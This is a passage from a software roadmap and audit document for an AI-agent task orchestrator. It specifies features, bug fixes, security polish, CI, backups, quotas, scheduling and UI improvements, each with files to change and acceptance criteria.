- **PR**: diff viewer (exists), PR link, rollback/retry buttons (exist).
- Files: new `apps/web/src/components/TaskDrawer.tsx`, Board refactor, one new
  route + types entry.

### F3. Mid-run control (the user explicitly wants this)

With B1/B3/B9 done, expose real mid-run intervention in the UI:

- **Stop this task** button on running cards (B1), with a confirm.
- **Add a task while running**: a "+ Add task" affordance on the Board (title,
  description, difficulty, scope, deps picker) → `POST /api/projects/:id/tasks`
  (new route, materialize a single task) → picked up live via B9.
- **Reprioritize**: drag between Backlog/Ready columns → PATCH status (B5 rules).
- **Pause modes**: split Pause into "Pause (finish current tasks)" — set
  `paused` but let active tasks complete (new orchestrator flag `drain`) — and
  "Stop now" (current abort behavior). Two buttons in ProjectHeader.
- Files: orchestrator (drain flag), engine-runner, index.ts (add-task route),
  Board/ProjectHeader, types.

### F4. Live "mission control" strip on the Board

The user wants to glance and know what the team is doing. Add a slim strip above
the columns: one row per **active agent** (model avatar, task title, elapsed time,
last-activity heartbeat — the activity map already exists in Board.tsx), plus
project burn: spend so far vs budget with a thin progress bar (data already in
`costAnalytics`), and count of pending approvals (deep-link to Notifications).
Files: new `apps/web/src/components/MissionControl.tsx`, Board.

### F5. Notifications that reach the user (not just a tab)

- **Browser notifications** (Notification API) for `action_required` and task
  failures when the tab is hidden; permission requested from Settings.
- **Approval deep links**: Telegram approval messages should include the PR URL
  and top validator reasons (data exists on the notification/decision) so the user
  can decide from the phone without opening the app.
- **Digest setting**: `settings.telegram.digest: "off" | "terminal" | "all"` —
  "terminal" (default) pushes only done/failed/approval; "all" adds per-attempt
  progress. Wire in `EngineRunner.onTaskUpdated`/`taskStatus`.
- Files: `useToast`-style `useBrowserNotify` hook, telegram.ts, engine-runner,
  Settings page, types.

### F6. Model health + subscription awareness

For the multi-subscription audience, per-model observability:

- **Health panel** on SetupView: last `testModels` result per model (persist
  results to a small `model_checks` table with ts), rolling failure rate from
  `runs` (exit_reason error/stuck per model), median run duration.
- **Rate-limit cooldown**: when an adapter failure looks like a rate limit
  (`/rate.?limit|429|too many requests|quota/i` on the summary), mark the model
  "cooling down" in-memory for N minutes (EngineRunner map) and have the
  orchestrator's dispatch skip it (treat like budget-blocked, log once) so the
  fallback chain routes around it instead of burning attempts.
- Files: adapters (classify exitReason `rate_limited`), orchestrator (skip set),
  engine-runner, setup.ts, SetupView, types.

### F7. Cost guardrails short of the hard stop

Budget today is a cliff (checkBudget → refuse). Add soft rails:

- Warning notifications at 50% / 80% of project budget and global monthly budget
  (emit once per threshold — track in a `budget_alerts` table or settings JSON),
  pushed via WS + Telegram.
- Board budget bar turns amber/red at the thresholds (data exists in analytics).
- Per-task estimate chip on Ready cards ("~$0.03") using the existing
  `getModelRunAverages`.
- Files: budget.ts (threshold helper), engine-runner (check after each cost
  record), CostView/Board, types.

### F8. Autonomous-run report card

When a run ends (the `finally` in `EngineRunner.start`), generate a **run
summary**: tasks done/failed, total cost, duration, PRs merged (links), approvals
that were required, and the top failure reasons — persist as an `audit_log` entry
(kind `run_summary`) and send it to Telegram (the `info` push exists but is one
line — make it the digest). Render past run summaries at the top of AuditView.
This is the "get updates" feature for away-from-keyboard autonomy. Optional
(behind a toggle): pipe the summary through the `updates`-role model (Grok) for a
natural-language paragraph — but the mechanical digest must not depend on a model.
Files: engine-runner, repo (audit query by kind), AuditView, telegram.

### F9. Project templates & per-project gate config

- Per-project overrides (new `projects.config` JSON column): gate script names
  (which npm scripts count as gates — the P2 roadmap item; repos vary),
  `maxAttempts`, merge policy override, and a "test command" free-field for
  non-npm stacks (run via execFile with args split, no shell).
- `GateRunnerImpl` reads the override through a new `SchedulerDeps.gateConfig`.
- NewProject gains an "Advanced" accordion for these; sensible defaults unchanged.
- Files: types, schema (+migration in db/index.ts), gate-runner, engine-runner,
  NewProject/ProjectHeader.

### F10. Ship it like a product: packaging & deployment

- **Serve the built web app from the server** (the Round-3 note in
  ARCHITECTURE.md): `@fastify/static` on `apps/web/dist` when it exists;
  `npm run start` = build all + run server; then one port, no CORS in prod (S2).
- **Single-command run**: root scripts `npm run start` (prod) and `npm run setup`
  (interactive: create `.env`, run setup checks in terminal). A `bin` entry
  (`hoopedorc` CLI: `start|init`) so `npx`/global install works.
- **systemd unit + Dockerfile** in `deploy/` (Docker mounts the repos dir, the
  DB, and the user's `~/.config` for gh/claude/opencode auth — document the
  caveats; native + systemd is the primary path since the CLIs need auth).
- **Versioning**: keep a real CHANGELOG.md for the orchestrator itself; tag
  releases.
- Files: server (static serving), package.json(s), deploy/, README.

### F11. Docs for other users

README today is contributor-oriented. Add `docs/USER_GUIDE.md`: what it is (3
paragraphs), install + prerequisites (subscriptions needed per model, opencode
auth walkthrough), first project tutorial (plan chat → review table → start →
watch board → approval on Telegram), the safety model (gates, validator,
risky-change rules, budgets, rollback), remote setup (Tailscale + HOST +
API_TOKEN from S2), and a troubleshooting table built from the real failure modes
in NEXT_STEPS.md (PWD bug symptoms, opencode lock collisions, vacuous gates…).
Link it from the README and the app's Setup page.

### F12. Multi-project run queue — LOW priority

`engine.orchestrators` already supports concurrent projects, but they compete for
the same models (per-model `maxConcurrent` is enforced per-orchestrator, not
globally — two projects can each run 2 deepseek-flash tasks). Move
`modelActiveCount` up to a shared registry in `EngineRunner` passed via deps so
per-model caps hold across projects. UI: Projects page shows per-project
running/paused status with start/pause inline (mostly exists).

### F13. Sandbox mode for agents & gates — FUTURE (note only, don't build now)

The honest security posture (S5, B11) is "agents and repo scripts execute on the
host". A `SANDBOX=container` mode running each worktree's agent + gates inside a
disposable container (repo mounted, no host env, network-restricted) is the real
fix. Requires the CLIs authenticated inside the image — significant work; design
doc first (`docs/specs/sandbox.md`), do not attempt as part of this pass.
**F18 wrote that design doc** — see [`docs/specs/sandbox.md`](specs/sandbox.md)
for goals/non-goals, the container-auth problem, worktree mount model, network
policy, env sanitization, gates-in-container, and the phased rollout. Still no
implementation — F13 itself remains future work.

---

## Part 3 — Review-pass fixes & next features (Fable audit, 2026-07-05)

Produced by independently auditing the merged Phase 6 code (PRs #37–#40) plus
the surrounding areas it touches — every "Problem" below was confirmed against
the actual code on `main` at `v0.1.0`, not inferred from the progress notes.

**Workflow (same as Parts 1–2, plus):**
- One branch/PR per item (or a small coherent batch), item IDs in commit
  messages, update the Phase 7/8 tables in the Progress section as you land.
- Verification bar is unchanged: typecheck/build/engine+adapter tests green,
  and live verification against a real (non-mock) server for anything with a
  runtime surface. **Put the verification evidence in the PR description** —
  Fable re-verifies each item after merge and will use those as the checklist.
- For browser verification: the Chrome extension tool has TWO connected
  browsers on this account. Call `list_connected_browsers` first and select
  the **macOS one marked `isLocal: true`** ("Browser 1") — the other is a
  remote Windows browser that cannot reach this Mac's localhost and produces
  misleading "Frame with ID 0 is showing error page" errors on every call.

### B16. Dockerfile build stage certainly fails — HIGH (broken artifact)

**Where:** `deploy/Dockerfile` lines 8–12.

**Problem:** every workspace `tsconfig.json` (all five: types, adapters,
engine, server, web) contains `"extends": "../../tsconfig.base.json"`, but the
build stage only copies `package*.json`, `packages/`, and `apps/` — so
`RUN npm run build` fails on the missing base tsconfig. Separately, the root
`package.json` declares `"bin": { "hoopedorc": "./bin/hoopedorc.mjs" }` and a
`setup` script pointing at `scripts/init.mjs`; neither `bin/` nor `scripts/`
is copied, and `npm ci` errors (ENOENT) when linking a declared bin whose file
doesn't exist — so even the install step is at risk, not just the build. This
was shipped labeled "unverified reference" but it is *deterministically*
broken, which is worse than unverified.

**Fix:** in the build stage, before `RUN npm ci`, add:
```dockerfile
COPY tsconfig.base.json ./
COPY bin ./bin
COPY scripts ./scripts
```

**Acceptance (no Docker daemon on this machine — simulate the build context):**
copy *exactly* the paths the Dockerfile COPYs (after the fix) into a fresh temp
dir — `package.json`, `package-lock.json`, `tsconfig.base.json`, `bin/`,
`scripts/`, `packages/`, `apps/` and nothing else (no root `node_modules`, no
`.env`, no `docs/`) — then run `npm ci && npm run build` inside it. Both must
succeed. Delete the temp dir after.

### B17. A configured-but-missing gate script silently passes — HIGH (safety rail gap)

**Where:** `packages/engine/src/gate-runner.ts` — `runGate()` (~line 55) and
the `gates?.testScript` string branch of `runTestsGate()` (~line 76).

**Problem:** F9's override plumbing routes `runGate(cwd, slot, override)` →
`runScript(cwd, override || slot)`, and `runScript` returns
`{ passed: true, ran: false }` when `hasNpmScript()` doesn't find the script.
That behavior is *correct* for the default slot names (it's the B11 vacuous
mechanism: repo simply has no "lint" script → nothing to run → vacuous check
catches the aggregate). But an **explicitly configured** override that names a
missing script — a typo (`"tc:strict"` vs `"tc-strict"`), or the repo renaming
its scripts later — silently passes the gate with `ran: false`, and the
vacuous check only fires if *all four* gates ran nothing. Contrast:
`testCommand` already fails loudly when its command doesn't exist, with a
comment explaining exactly this reasoning ("explicitly configured by the
operator, so any failure … is a real gate failure"). The same rule must apply
to explicit script-name overrides.

**Fix:**
1. In `runGate()`: when `typeof scriptOverride === "string"` and
   `!hasNpmScript(cwd, scriptOverride)` → return
   `{ passed: false, ran: true, output: 'configured gate script "<name>" not found in package.json' }`.
2. Same guard in `runTestsGate()`'s `gates?.testScript` string branch before
   it calls `runScript`.
3. **Do NOT touch the default-slot path.** A missing *default* script
   ("typecheck"/"lint"/"build"/"test"/"tests" with no override) must keep
   returning `{ passed: true, ran: false }` — that is the vacuous-gate
   machinery and existing tests depend on it.

**Acceptance:** new unit tests in `gate-runner.test.ts`: (a) override →
missing script fails the gate with "not found" in the output; (b) testScript
override → missing script fails the tests gate; (c) the existing default-slot
tests (missing default scripts pass with `ran: false`, vacuous aggregate) stay
green untouched.

### B18. A capacity-blocked project waits in total silence — MEDIUM (observability)

**Where:** `packages/engine/src/orchestrator.ts` — the
`active >= cfg.maxConcurrent` skip (~line 362) that F12 gave the
`blockedByCapacity` flag.

**Problem:** budget blocks and cooldown blocks each emit a warn-once log
(`budgetBlockedWarned` / `cooldownBlockedWarned`); the capacity skip emits
nothing. Post-F12 the cap is global, so a project can now sit polling at 250ms
for *minutes* waiting on another project's model slot with zero log lines —
on the Board it is indistinguishable from a hang.

**Fix:** mirror the existing pattern exactly: add
`private readonly capacityBlockedWarned = new Set<string>();`, clear it in
`start()` alongside the other two `.clear()` calls, emit warn-once
(`"Model at capacity (in use by another task or project), holding: <model>"`,
level `"warn"`, source `"engine"`, with the task id) when the capacity skip
fires, and `capacityBlockedWarned.delete(task.id)` on the dispatch path right
where the budget/cooldown warned-sets are deleted.

**Acceptance:** unit test: shared-registry deps hooks pre-loaded at the cap →
loop runs several passes → exactly one capacity warn log for the task; then
`decModelActive` mid-test → task dispatches and completes.

### B19. Manual dispatch is invisible to the global model cap — MEDIUM

**Where:** `packages/engine/src/orchestrator.ts` `runTask()` (~line 472);
stale doc-comment on `manualRuns` in `packages/server/src/engine-runner.ts`.

**Problem:** `runTask` (the `/dispatch` path) never calls
`incModel`/`decModel`, so a manually-dispatched task doesn't count toward the
shared F12 registry — an autonomous loop will happily dispatch `maxConcurrent`
*more* copies of the same model on top of it. The F12 PR documented this as
intentional; on reflection it's half-right: a manual dispatch *shouldn't be
blocked* by the cap (an explicit human action must not silently queue), but it
*must be visible* to everyone else's capacity accounting.

**Fix:** in `runTask`, before `executeTask`:
`this.incModel(task.assignedModel); this.runningModel.set(task.id, task.assignedModel);`
— and in the `finally`, replicate `start()`'s dispatch-finally exactly
(fallback escalation can switch the model mid-run, so decrement
`this.runningModel.get(task.id) ?? task.assignedModel`, then delete from
`runningModel` and `activeTaskIds`). Do **not** add a capacity *check* to
`runTask` — count it, don't block it. Update the `manualRuns` doc-comment in
`engine-runner.ts`, which currently states manual runs "never contribute to
that count" — after this fix they do.

**Known-and-accepted (do not "fix", just leave this note):** fallback
escalation (`switchRunningModel`) increments the next model without checking
its cap — a task already in flight escalating to a busy model may transiently
exceed the cap. Blocking mid-task on capacity would risk deadlock; the
transient overshoot is the lesser evil.

**Acceptance:** unit test: `runTask` holds model X (blocking adapter,
`maxConcurrent: 1`, shared registry hooks) → a second Orchestrator's `start()`
with a ready task on X does not author until the manual run resolves; both
finish `done`.

### S6. Auth polish: real login screen, constant-time compare, doc note — MEDIUM

**Where:** `apps/web/src/api/client.ts` (~line 71: `window.prompt`),
`packages/server/src/index.ts` auth hook (~line 560: `bearer !== token`),
`docs/USER_GUIDE.md` (Remote setup section).

**Problem:** three leftovers. (1) The `window.prompt()` token entry was
explicitly flagged back in S2's notes as a stopgap "F1 should replace" — F1
never did. (2) The bearer comparison uses `!==`, not a constant-time compare
(low risk behind Tailscale, but it's a one-liner to do right). (3) When
`API_TOKEN` is set, the SPA shell + JS assets are still served without auth
(only `/api/*` and `/ws` are guarded) — this is *by design* (the shell
contains no data) but is documented nowhere.

**Fix:**
1. **Login screen.** New `apps/web/src/components/TokenGate.tsx`: a small
   centered card (token password-input, error line, submit) in the app's
   existing dark style. `client.ts`: replace the `window.prompt` block with a
   registered handler — `export function setUnauthorizedHandler(h: () => Promise<string | null>)`;
   on 401, `await` the handler, store the token (same localStorage key,
   `"hoopedorc.apiToken"`), retry once; a second 401 after retry surfaces as a
   normal error (the handler shows it and re-asks on the next call). `App.tsx`
   registers a handler that renders TokenGate and resolves with the entered
   token. **Constraints:** (a) when auth is off — the default — nothing may
   render or flash: TokenGate appears only after a real 401; (b) no WS changes
   needed — `useWS` already reads `getStoredApiToken()` on every reconnect
   attempt and backoff-retries, so it picks up the new token by itself
   (verify this during live-testing, don't re-implement it); (c) after this,
   `grep -r "window.prompt" apps/web/src` must return nothing.
2. **Constant-time compare.** In the server auth hook, compare via
   `node:crypto`'s `timingSafeEqual` on UTF-8 buffers with a length guard
   (length mismatch → reject without calling timingSafeEqual, which throws on
   unequal lengths). Apply to both the bearer header and the `?token=` query
   param paths.
3. **Docs.** One short paragraph in USER_GUIDE's Remote setup: the app shell
   itself is served without a token; all data still requires one.

**Acceptance:** live-verified in a real browser against a real server booted
with `API_TOKEN=...`: first load shows the in-app TokenGate (no browser
prompt); wrong token → inline error, stays on the gate; correct token → app
loads fully *including live WS events* (start a project or trigger any WS
event to prove the socket authenticated); with auth off, the gate never
appears. Typecheck/build green.

### F14. CI for this repo — GitHub Actions (highest leverage, do first in Phase 8)

The repo has **zero CI** — every "green" claim in Phases 1–6 was a local run.
Ironic, given the product's premise is enforcing gates.

- New `.github/workflows/ci.yml`: trigger on `pull_request` and on `push` to
  `main`. Single job on `ubuntu-latest`: `actions/checkout@v4`,
  `actions/setup-node@v4` with `node-version: 22` and `cache: npm`, then
  `npm ci`, `npm run typecheck`, `npm run build`, `npm test -w @orc/engine`,
  `npm test -w @orc/adapters`. No secrets are needed (nothing in the test
  suites touches a real model or GitHub).
- Do **not** add a Docker build step (B16 makes the Dockerfile buildable in
  principle, but there's no need to spend CI minutes proving it every PR).
- Note: engine tests spawn real `npm`/`git` subprocesses (gate-runner tests
  create temp repos) — both exist on ubuntu-latest runners; no extra setup.

**Acceptance:** the workflow runs green on its own PR (visible via
`gh pr checks`). After merge, `main` shows a green check.

### F15. "Wait for GitHub checks" merge gate (old P2 roadmap item)

Local gates can't see the target repo's own CI. Add an **opt-in, per-project**
gate that holds an auto-merge until the PR's GitHub checks pass.

- **Types:** `ProjectConfig` gains `requireGithubChecks?: boolean` and
  `githubChecksTimeoutMin?: number` (default 15). Extend `parseProjectConfig`
  in `packages/server/src/index.ts` (boolean; integer 1–120) and the
  `ProjectConfigFields` Advanced accordion (checkbox + number input). Update
  CONTRACT.md's ProjectConfig paragraph.
- **Engine:** `GitService` gains
  `waitForChecks(project, prNumber, timeoutMs): Promise<"passed" | "failed" | "none" | "timeout">`,
  implemented in `git-service.ts` with `gh pr checks <n> --repo <owner/repo>`
  polled every ~15s (execFile arg arrays, as everywhere else in that file).
  **Before writing it, verify the installed `gh`'s actual behavior by hand**
  (`gh pr checks --help`, and run it against a real PR): exit 0 = all checks
  passed; non-zero = failing OR still pending (parse stdout to tell them
  apart); and the no-checks-configured case prints a distinctive
  "no checks reported" style message — map that to `"none"`. Do not trust
  this paragraph over the real CLI: check first, as B7/F9 did.
- **Orchestrator:** in `executeTask`, after the validator approves and before
  the merge (near the `canAutoMerge` call, ~line 856): if
  `project.config?.requireGithubChecks`, await `waitForChecks`. `"passed"` /
  `"none"` → proceed. `"failed"` / `"timeout"` → do NOT merge; route into the
  existing `requestApproval` escalation with the reason ("GitHub checks
  failed" / "timed out after Nmin") so a human decides. **While polling, emit
  an info log line per poll** ("Waiting for GitHub checks (Xm)…") — the stuck-
  task detector watches log activity, and a silent multi-minute wait would
  trip it (verify against `STUCK_DETECTION` in orchestrator.ts).
- Also honor B1: check `bailIfStopRequested` after the wait returns.

**Acceptance:** engine unit test with a fake GitService covering all four
outcomes (merge proceeds on passed/none; escalates on failed/timeout; nothing
merges after a Stop during the wait). Live verification: optional but ideal —
one run against the throwaway repo with a trivial always-pass workflow.

### F16. Subscription quota awareness (the multi-subscription feature)

Rate-limit cooldowns (F6) react *after* a model starts failing. Subscriptions
have known windows — Claude Pro's usage caps being the motivating case — so
let the operator declare them and route around exhaustion *before* burning
attempts.

- **Types:** `ModelConfig` gains
  `quota?: { windowHours: number; maxRuns?: number; maxCostUsd?: number }`
  (at least one of maxRuns/maxCostUsd must be set for the quota to mean
  anything — validate on settings save). CONTRACT.md note.
- **Server:** `EngineRunner.checkModelQuota(modelId): string | null` — if the
  model's config has a quota, count its runs (`runs` table, `started_at >=`
  now − window) and sum its cost (`costs` table, same window) **across all
  projects**, and return a reason string when either limit is met.
- **Engine:** new optional `SchedulerDeps.checkModelQuota?` hook. Consult it
  in **both** places `checkBudget` is consulted (the dispatch loop ~line 319
  AND the retry/attempt path ~line 502) with identical skip-don't-fail,
  warn-once semantics — new `quotaBlockedWarned` set following the exact
  budget/cooldown pattern (including B18's `.clear()` in `start()` and
  `.delete()` on dispatch).
- **UI:** three small inputs in Settings' ModelsEditor per model (window
  hours, max runs, max cost). Skip dashboards for now; enforcement first.
  (Optional nice-to-have: show "N runs / $X used this window" in SetupView's
  model-health panel — only if cheap.)

**Acceptance:** engine unit test (hook returns a reason → task skipped, warn
logged once, dispatches after the hook returns null). Server-side standalone
script (the established `as any` pattern against a real in-memory SQLite DB):
seed runs/costs rows inside and outside the window, assert the window math —
runs-limit, cost-limit, and no-quota-configured cases.

### F17. DB backup rotation

`deploy/README.md` says "back it up"; nothing does.

- New `packages/server/src/db/backup.ts`: `runBackup(db, dbPath)` — skip
  entirely when the DB is in-memory (`:memory:`) or `ENV.mock`; otherwise use
  better-sqlite3's built-in online backup API (`db.backup(destPath)`, returns
  a promise — **check the installed version's API signature** in
  `node_modules/better-sqlite3/lib` before writing) into
  `DB_BACKUP_DIR` (env; default: `<dirname(dbPath)>/backups/`), filename
  `hoopedorc-YYYY-MM-DD-HHmm.db`; `mkdir -p` the dir; prune to the newest
  `DB_BACKUP_KEEP` (env, default 7).
- Wire in `main()` next to the log-prune scheduling: run on boot + every 24h
  (`setInterval(...).unref()`), try/catch with a warn log — a failed backup
  must never crash the server.
- Add the two env vars to `.env.example` + ENV in `config.ts`.

**Acceptance:** boot with a file DB → a backup file appears with today's
timestamp; pre-seed 9 dummy older backup files → pruned to 7 (newest kept);
mock/in-memory boot creates nothing.

### F18. Sandbox design doc — docs only, no code

Write `docs/specs/sandbox.md` fleshing out F13: goals/non-goals, the
authenticated-CLIs-inside-a-container problem (incl. the F10 finding that
Claude Code's login lives in the macOS Keychain → `ANTHROPIC_API_KEY` is the
only container path and bills differently), worktree mount model, network
policy, env sanitization inside vs outside, gates in-container, and a phased
rollout (gates-only sandbox first, agents later). Link it from F13's entry
above and from the README security section. **No implementation.**

### F19. Scheduled runs — IN SCOPE (user opted in 2026-07-06, after Phase 7)

Cron-style "start project X every night" for maintenance tasks. Do after
F14–F17 (needs CI to trust it, and should respect the quota/backup rails
those add). Design: a small `schedule` field on `Project` (or a new table if
multiple schedules per project end up wanted) holding a simple recurrence —
prefer a deliberately dumb interval/time-of-day scheduler over pulling in a
cron-parse dependency unless real cron syntax turns out to be worth the
weight (decide once the shape is clearer). A `setInterval` check (mirroring
the existing log-prune/backup boot+interval pattern in `main()`) compares
current time against each project's next-due time and calls the existing
`EngineRunner.start(project)` path — no new dispatch mechanism, just a timer
that triggers the same button the UI's Start does. Surface it in
`ProjectConfigFields`/`ProjectHeader` (enable + a simple "every day at HH:MM"
or "every N hours" control) alongside F9's other per-project config.

---

## Part 4 — Post-plan audit & UX wave (Fable, 2026-07-06)

Two halves. First, the **audit record** for the merged Phase 7/8 work:
item-level acceptance criteria all held up and CI stayed green, but three
cross-cutting integration defects were found and fixed the same day
(PR [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57)) — they're
recorded as A1–A3 below so the reasoning isn't lost. Second, the **UX
wave**: findings from driving every page of the real app (mock server, real
browser, desktop and phone widths), specced as U1–U10 for Sonnet to
implement top-down. Same ground rules as Parts 1–3 — branch → PR → merge,
CI (F14) green on every PR, verification evidence in PR descriptions,
live-verify anything with a runtime surface. Note the standing rule from
the top of this doc: UI work is live-verified in a real browser (the
`agent-browser` pattern used since Phase 4), not just typechecked.

### A1–A5. Audit record (already fixed — do not re-implement)

- **A1 (PR #57)** — `apps/web/src/api/client.ts`: a fresh page load against
  a token-requiring server fires several `api()` calls at once; each 401
  invoked the TokenGate handler separately, and since `App.tsx` keeps a
  single resolver, each invocation clobbered the previous caller's —
  leaving every earlier call hanging forever (e.g. `listProjects` losing
  the race left the project dropdown on "No projects"). Fixed by sharing
  one in-flight handler promise across all concurrent 401s.
- **A2 (PR #57)** — `checkSchedules` (`packages/server/src/index.ts`) never
  set the project status to `"running"` nor broadcast `project.updated`
  (the `/start` route does both), so a scheduled run showed a stale status
  for its whole duration. Fixed by mirroring the route on successful
  kickoff.
- **A3 (PR #57)** — `isScheduleDue` daily mode required the *exact* HH:MM
  minute; `setInterval(60s)` drift can skip a minute boundary, silently
  losing that day's run. Fixed with a 5-minute grace window (still
  once-per-day; deliberately not retroactive across a server that was down
  at the scheduled time — cron semantics, not anacron).
- **A4** — CHANGELOG.md had no 0.2.0/Phase 7–8 entries; added.
- **A5** — USER_GUIDE.md didn't cover subscription quotas, scheduled runs,
  the GitHub-checks gate, or backups; added (two safety-model bullets plus
  "Scheduled runs" and "Backups & data" sections).

### U1. Global "action required" indicator in the nav — HIGH (the product's core promise)

**Where:** `apps/web/src/App.tsx` (the `NAV` row), data from
`GET /api/notifications` + the global `notification` WS events.

**Problem:** pending approvals — the one thing an unattended run genuinely
blocks on — are only visible in the Board's MissionControl strip or by
opening the Notifications tab. On any other page there is zero indication
that a run is sitting frozen waiting for a human tap.

**Fix:** a count badge on the "Notifications" nav item: number of
notifications with `requiresApproval` and no `respondedWith`. Seed it from
one fetch on mount; keep it live from the (already-global, see B15)
`notification` WS events and decrement on respond. Amber dot/count style
consistent with MissionControl's existing approval chip.

**Acceptance:** with a pending approval, every page shows the badge; tapping
through and responding clears it without a reload; zero pending = no badge
(not a "0").

### U2. Slim ProjectHeader outside the Board — HIGH (screen real estate)

**Where:** `apps/web/src/App.tsx` (renders `ProjectHeader` for every page in
`PROJECT_PAGES`), `apps/web/src/components/ProjectHeader.tsx`.

**Problem:** the full header — budget editor, Advanced config accordion,
Pause/Stop buttons — repeats at full size on Plan, Costs, Audit, and
Notifications, eating ~120px before each page's own content starts. Budget
and gate-config editing have nothing to do with reading the audit log.

**Fix:** give `ProjectHeader` a `compact` prop: one row (name, repo link,
status chip, Start/Pause/Stop). `App.tsx` passes `compact` for every
project page except Board. Board keeps the full editor.

**Acceptance:** Plan/Costs/Audit/Notifications show the one-row header with
working run controls; Board is unchanged; budget/config editing still
reachable on Board.

### U3. Board columns overflow with no affordance — HIGH

**Where:** `apps/web/src/pages/Board.tsx` (column list comes from
`TASK_STATUSES`).

**Problem:** 8 fixed-width columns at 1280px push CHANGES REQ., BLOCKED,
DONE, and FAILED past the right edge with no scroll hint — on first load it
looks like the board has 4–5 columns, and terminal columns (the ones that
tell you what finished/failed) are the hidden ones.

**Fix:** collapse *empty* columns to a slim vertical strip (rotated title +
count 0) that expands on click and on `dragover` (so drag-to-status still
works). Non-empty columns keep full width. Alternative acceptable
implementation: keep all 8 full-width but add a visible horizontal-scroll
affordance + auto-scroll to the busiest column; prefer the collapse.

**Acceptance:** with the mock seed (4 non-empty columns), all 8 states are
visible at 1280px without horizontal scrolling; dragging a card onto a
collapsed empty column still drops correctly; a column with cards never
collapses.

### U4. Unsaved Settings edits are silently discarded — HIGH (data loss)

**Where:** `apps/web/src/pages/Settings.tsx`, `apps/web/src/App.tsx`
(`{page === "settings" && <Settings />}` unmounts it on tab switch).

**Problem:** Settings is one long form (models, routing, budgets, Telegram)
with a Save button; switching to any other tab unmounts the component and
every unsaved edit vanishes without warning.

**Fix:** track dirty state in Settings (compare against the fetched
snapshot, the same dirty-check pattern ProjectHeader's budget row already
uses); expose it to App via a callback or module-level flag; on nav-away
while dirty, `window.confirm` ("Discard unsaved settings changes?") —
cancel keeps the user on Settings. Also make the Save row sticky at the
bottom of the viewport with a visible "unsaved changes" hint so the state
is obvious before it's a problem.

**Acceptance:** edit any field → switch tab → confirm dialog appears;
cancel stays with edits intact; save → switch is silent; the Save control
is visible without scrolling on a 800px-tall window.

### U5. MissionControl elapsed label reads "42s ago elapsed" — TRIVIAL

**Where:** `apps/web/src/components/MissionControl.tsx` (reuses TaskCard's
`agoLabel`, then appends "elapsed").

**Problem:** `agoLabel` returns "42s ago", producing the ungrammatical
"42s ago elapsed" on every active-agent row.

**Fix:** strip the "ago" for this usage — "elapsed 42s" (or "running for
42s"). One-line formatting change; don't change TaskCard's own usage.

**Acceptance:** an active agent row reads "elapsed 42s" (and "elapsed
2m 3s" past a minute).

### U6. Model-reassign dropdown on every kanban card — MEDIUM

**Where:** `apps/web/src/components/TaskCard.tsx` (full `<select>` of the
model roster on every card), `apps/web/src/components/TaskDrawer.tsx`.

**Problem:** every card carries the full model dropdown — visually the
heaviest element on the board, mostly disabled (active tasks can't be
reassigned), and an easy accidental-click target on the cards where it is
enabled.

**Fix:** replace the card's `<select>` with the plain model chip it already
shows elsewhere; move reassignment into TaskDrawer's Overview tab (same
enable/disable rules the card enforces today — only non-active tasks).

**Acceptance:** cards show a static model chip; reassigning from the drawer
updates the card live; active tasks can't be reassigned (control disabled
with the current model shown).

### U7. Schedules are invisible outside the accordion; disabling loses the times — MEDIUM (F19 follow-up)

**Where:** `apps/web/src/components/ProjectConfigFields.tsx`
(`projectConfigFromForm` drops `schedule` entirely when the enable checkbox
is off), `ProjectHeader.tsx` / `pages/ProjectsView.tsx` (no schedule
display anywhere).

**Problem:** (1) a configured schedule shows nowhere except inside the
Advanced accordion — nothing on the header or Projects page says "this
project auto-starts nightly at 03:00", which is exactly the kind of thing
that surprises you at 3am. (2) unchecking "enabled" and saving deletes the
whole schedule object, so re-enabling later starts from blank inputs.

**Fix:** (1) when a schedule exists and is enabled, show a small chip on
ProjectHeader (both variants, see U2) and on the ProjectsView row: "⏱ daily
03:00" / "⏱ every 6h". (2) `projectConfigFromForm`: when the checkbox is
off but times/interval are filled in, emit `{ enabled: false, …times }`
instead of omitting `schedule` — the scheduler already ignores disabled
schedules (`isScheduleDue` checks `enabled` first), so persisting them is
free.

**Acceptance:** an enabled schedule is visible on the header and Projects
row; disable → save → re-enable round-trips the configured times; a
never-configured project shows no chip.

### U8. Headline costs render as "$0.0000" — LOW

**Where:** `apps/web/src/pages/CostView.tsx` (stat tiles),
`apps/web/src/components/BoardSummary.tsx` ("$0.0000 spent").

**Problem:** four-decimal precision makes sense for a $0.0034 per-task
cost, but headline tiles ("Total spend", the board's "spent" figure)
reading "$0.0000" look broken rather than precise.

**Fix:** one shared `formatUsd(n)` helper (e.g. in `apps/web/src/lib/` or
next to the api client): `>= $0.01` → 2 decimals; `> 0` and `< $0.01` → 4
decimals; `0` → "$0.00". Use it for headline stats and the board summary;
keep 4-decimal precision on per-task/per-run rows where sub-cent amounts
are the norm.

**Acceptance:** a fresh project's board reads "$0.00 spent"; a $0.0034 task
row still shows "$0.0034"; a $1.234567 total shows "$1.23".

### U9. "New Project" is a nav tab though it's an action — LOW

**Where:** `apps/web/src/App.tsx` (`NAV` array + the top row with the
project selector).

**Problem:** the tab row mixes places (Board, Costs…) with an action (New
Project), and the action also appears as a button in empty states — two
ways in, one of them pretending to be a page.

**Fix:** remove `new-project` from `NAV`; add a small "+ New" button next
to the project selector in the top row (it's an app-level action, so it
belongs with the app-level selector). The `page` state keeps supporting
`"new-project"` — only the affordance moves. While in there, visually
separate project-scoped tabs (Board…Notifications) from global ones
(Projects/Settings/Setup) with a divider.

**Acceptance:** New Project reachable from every page via the top-row
button; the tab list has 8 entries; empty-state buttons still work.

### U10. Dependency chips truncate with no full-title affordance — TRIVIAL

**Where:** `apps/web/src/components/TaskCard.tsx` (the "blocked by …"
chips).

**Problem:** chips ellipsize ("blocked by Orchestrator eng…") and there's
no hover/tooltip to read the full dependency title.

**Fix:** `title` attribute with the full task title on each chip.

**Acceptance:** hovering a truncated chip shows the full title.

### What the walkthrough did NOT flag (for calibration)

The narrow/phone layout genuinely holds up (the two-row nav and full-width
cards adapt cleanly — F4's layout comments paid off); Setup & Health is the
strongest page in the app; empty states (Audit, Notifications) are clear;
the TaskDrawer and TokenGate are clean. The wave above is polish on a
fundamentally sound UI, not a redesign.

### Beyond the UX wave (not specced — decide when U1–U10 land)

- **F13 phase 1 — gates-only sandbox**, per `docs/specs/sandbox.md`'s
  phased rollout. The biggest remaining security-posture item.
- **A real `@orc/server` test package.** The only workspace with no test
  script. `scheduler.ts`, `budget.ts`, and `db/backup.ts` are pure or
  near-pure and already have exactly-shaped standalone-script verifications
  from Phases 5–9 to port into `node --test` files; wire into CI's existing
